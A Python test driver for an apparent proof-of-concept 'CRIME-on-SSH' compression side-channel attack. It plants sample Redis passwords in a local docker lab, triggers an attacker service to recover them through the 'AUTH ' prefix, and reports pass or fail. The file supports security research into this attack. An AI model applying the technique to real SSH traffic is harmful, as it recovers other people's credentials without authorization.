"""End-to-end attack test against several known Redis passwords.

Run from the host while the docker-compose stack is up:

    python scripts/test_attack.py

For each test secret it
  1. POSTs /set_secret to the client (which reconfigures the Redis
     password via CONFIG SET, then reconnects SSH so the LZ77
     dictionary starts fresh).
  2. POSTs /run_attack to the attacker.
  3. Compares the recovered value with the planted secret.
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"

PREFIX = "AUTH "
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"

# 5 test passwords drawn from {ALPHABET}, of varying length and content.
TEST_SECRETS = [
    "hunter2",
    "correcthorse",
    "pa55word",
    "letmein9",
    "tr0ub4dor",
]


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 1800.0) -> dict:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def set_secret(value: str) -> None:
    body = json.dumps({"value": value}).encode("utf-8")
    http("POST", f"{CLIENT_BASE}/set_secret", body=body,
         content_type="application/json")


def run_attack(max_length: int = 24) -> dict:
    body = json.dumps({
        "known_prefix": PREFIX,
        "alphabet": ALPHABET,
        "max_length": max_length,
    }).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack", body=body,
                content_type="application/json")


def main() -> int:
    print("CRIME-on-SSH PoC: end-to-end attack test (Redis AUTH)")
    print(f"Target prefix: {PREFIX!r}")
    print(f"Alphabet:     {ALPHABET!r}  ({len(ALPHABET)} chars + terminator)")
    print(f"Test secrets: {TEST_SECRETS}")
    print()

    results = []
    for idx, secret in enumerate(TEST_SECRETS, 1):
        print("=" * 72)
        print(f"  [{idx}/{len(TEST_SECRETS)}] target Redis password = {secret!r}")
        print("=" * 72)
        set_secret(secret)
        # let the client finish reconnecting and re-establishing tunnels
        time.sleep(2.0)

        started = time.time()
        result = run_attack(max_length=max(20, len(secret) + 4))
        elapsed = time.time() - started
        recovered = result.get("recovered", "").rstrip("\r\n")
        ok = recovered == secret
        status = "PASS" if ok else "FAIL"

        print(f"  recovered:   {recovered!r}")
        print(f"  expected:    {secret!r}")
        print(f"  attack time: {elapsed:.1f}s")
        print(f"  status:      {status}")
        print()
        results.append((secret, recovered, ok, elapsed))

    print("=" * 72)
    print("  SUMMARY")
    print("=" * 72)
    print(f"  {'expected':<16} {'recovered':<16} {'time':<10} status")
    print(f"  {'-'*16} {'-'*16} {'-'*10} ------")
    for secret, recovered, ok, elapsed in results:
        status = "PASS" if ok else "FAIL"
        print(f"  {secret:<16} {recovered:<16} {elapsed:>6.1f}s    {status}")

    n_pass = sum(1 for _, _, ok, _ in results if ok)
    print()
    print(f"  {n_pass}/{len(results)} tests passed")
    return 0 if n_pass == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
